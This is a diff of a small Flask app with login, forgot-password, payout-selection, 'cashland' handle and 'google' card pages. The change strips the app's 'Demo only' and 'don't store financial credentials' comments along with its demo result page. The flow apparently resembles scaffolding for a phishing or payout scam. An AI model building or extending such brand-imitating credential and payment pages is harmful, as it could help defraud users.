@@ -3,25 +3,16 @@ from flask import Flask, render_template, request, redirect, url_for, session
 
 app = Flask(__name__)
 
-# Set SECRET_KEY in Render's Environment Variables.
-# The fallback is only useful for local testing.
-app.secret_key = os.environ.get(
-    "SECRET_KEY",
-    "dev-only-change-this-secret"
-)
+app.secret_key = os.environ.get("SECRET_KEY", "hexer-dev-secret")
 
 
-# ─────────────────────────────────────────────
-# Main / Login
-# ─────────────────────────────────────────────
-
-@app.get("/")
-def login():
+@app.route("/")
+def home():
     return render_template("login.html")
 
 
-@app.post("/login")
-def handle_login():
+@app.route("/login", methods=["POST"])
+def login():
     email = request.form.get("email", "").strip()
 
     if not email:
@@ -30,22 +21,17 @@ def handle_login():
             error="Please enter your email or mobile number."
         )
 
-    session["demo_email"] = email
+    session["email"] = email
+    return redirect("/payout")
 
-    return redirect(url_for("demo_result"))
 
-
-# ─────────────────────────────────────────────
-# Forgot Password
-# ─────────────────────────────────────────────
-
-@app.get("/forgot-password")
+@app.route("/forgot-password")
 def forgot_password():
     return render_template("forgot.html")
 
 
-@app.post("/forgot-password")
-def handle_forgot_password():
+@app.route("/forgot-password", methods=["POST"])
+def forgot_password_submit():
     email = request.form.get("email", "").strip()
 
     if not email:
@@ -54,86 +40,49 @@ def handle_forgot_password():
             error="Please enter your email or mobile number."
         )
 
-    session["reset_email"] = email
-
-    return redirect(url_for("reset_sent"))
-
-
-@app.get("/reset-sent")
-def reset_sent():
     return render_template(
         "reset_sent.html",
-        email=session.get("reset_email", "")
+        email=email
     )
 
 
-# ─────────────────────────────────────────────
-# Demo Login Result
-# ─────────────────────────────────────────────
-
-@app.get("/demo-result")
-def demo_result():
-    return render_template(
-        "demo_result.html",
-        email=session.get("demo_email", "")
-    )
-
-
-# ─────────────────────────────────────────────
-# Payout Page
-# ─────────────────────────────────────────────
-
-@app.get("/payout")
+@app.route("/payout")
 def payout():
     return render_template("payout.html")
 
 
-@app.post("/payout/select")
+@app.route("/payout/select", methods=["POST"])
 def payout_select():
-    method = request.form.get("method", "").lower()
+    method = request.form.get("method")
 
     if method == "hexer":
-        return redirect(url_for("hexer_page"))
+        return redirect("/hexer")
 
     if method == "cashland":
-        return redirect(url_for("cashland"))
+        return redirect("/cashland")
 
     if method == "card":
-        return redirect(url_for("google_page"))
+        return redirect("/google")
 
-    return redirect(url_for("payout"))
+    return redirect("/payout")
 
 
-# ─────────────────────────────────────────────
-# HEXER
-# ─────────────────────────────────────────────
-
-@app.get("/hexer")
-def hexer_page():
-    # Put your existing HEXER page at:
-    # templates/hexer.html
+@app.route("/hexer")
+def hexer():
     return render_template("hexer.html")
 
 
-# ─────────────────────────────────────────────
-# CASH LAND
-# ─────────────────────────────────────────────
-
-@app.get("/cashland")
+@app.route("/cashland")
 def cashland():
     return render_template("cashland.html")
 
 
-@app.post("/cashland")
-def cashland_receive():
+@app.route("/cashland", methods=["POST"])
+def cashland_submit():
     handle = request.form.get("handle", "").strip()
 
     if not handle:
-        return redirect(url_for("cashland"))
-
-    # Demo only.
-    # Don't store financial credentials or sensitive payment information.
-    session["cashland_handle"] = handle
+        return render_template("cashland.html")
 
     return render_template(
         "cashland.html",
@@ -142,36 +91,18 @@ def cashland_receive():
     )
 
 
-# ─────────────────────────────────────────────
-# Existing Google Page
-# ─────────────────────────────────────────────
-
-@app.get("/google")
-def google_page():
-    # Put your existing file at:
-    # templates/google.html
+@app.route("/google")
+def google():
     return render_template("google.html")
 
 
-# ─────────────────────────────────────────────
-# Health Check
-# ─────────────────────────────────────────────
-
-@app.get("/health")
+@app.route("/health")
 def health():
-    return {
-        "status": "ok",
-        "service": "HEXER"
-    }
+    return "OK", 200
 
-
-# ─────────────────────────────────────────────
-# Local Development
-# ─────────────────────────────────────────────
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-
     app.run(
         host="0.0.0.0",
         port=port,
